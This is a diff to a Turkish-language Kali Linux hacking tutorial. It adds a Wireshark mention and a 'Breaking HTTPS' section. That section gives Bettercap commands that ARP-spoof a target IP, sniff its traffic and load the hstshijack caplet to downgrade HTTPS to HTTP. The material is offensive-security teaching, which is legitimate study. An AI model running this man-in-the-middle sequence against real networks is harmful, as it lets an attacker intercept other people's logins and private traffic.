@@ -61,12 +61,14 @@
     - [Bağlandığımız Ağları İncelemek](#ba%c4%9fland%c4%b1%c4%9f%c4%b1m%c4%b1z-a%c4%9flar%c4%b1-%c4%b0ncelemek)
       - [Netdiscover](#netdiscover)
       - [Nmap](#nmap)
+      - [Wireshark](#wireshark)
     - [Man In The Middle (Ortadaki Adam/MITM)](#man-in-the-middle-ortadaki-adammitm)
       - [ARP Spoof (ARP Kandırma)](#arp-spoof-arp-kand%c4%b1rma)
     - [Web Sunucu Kurmak](#web-sunucu-kurmak)
     - [Bettercap](#bettercap)
       - [Bettercap ile ARP Spoof](#bettercap-ile-arp-spoof)
       - [Bilgileri Çalmak](#bilgileri-%c3%87almak)
+    - [HTTPS Kırmak](#https-k%c4%b1rmak)
 
 # Giriş
 Bu döküman **Linux** işletim sisteminin **Kali Linux** dağıtımı üzerinde hazırlanmıştır. İlgili sistem bilgileri aşağıda bulunmaktadır.<br>
@@ -688,6 +690,10 @@ All 1000 scanned ports on 192.168.1.105 are closed
 Nmap done: 256 IP addresses (8 hosts up) scanned in 64.19 seconds
 
 ```
+#### Wireshark
+Ağları incelemek için kullanılan program. Terminale `wireshark` yazarak açabiliriz.
+
+
 
 ### Man In The Middle (Ortadaki Adam/MITM)
 MITM saldırısında olay kısaca şu şekilde işlemektedir;
@@ -743,3 +749,17 @@ Temel komut dizimi şu şekildedir:
 
 ![Bettercap Net Sniffing](./assets/17-bettercap-net-sniff.png)
 
+### HTTPS Kırmak
+- Hedefimizin IP adresini belirleriz -> **1-2**
+- Hedefimize karşı arp spoof başlatırız -> **3**
+- Ağda ne olup bittiğini izlemeye başlarız -> **4**
+- HTTPS siteleri HTTP'ye yönlendiririz -> **5**
+```
+1-) set arp.spoof.fullduplex true
+2-) set arp.spoof.targets 192.168.1.218
+3-) arp.spoof on
+
+4-) net.sniff on
+
+5-) hstshijack/hstshijack
+```
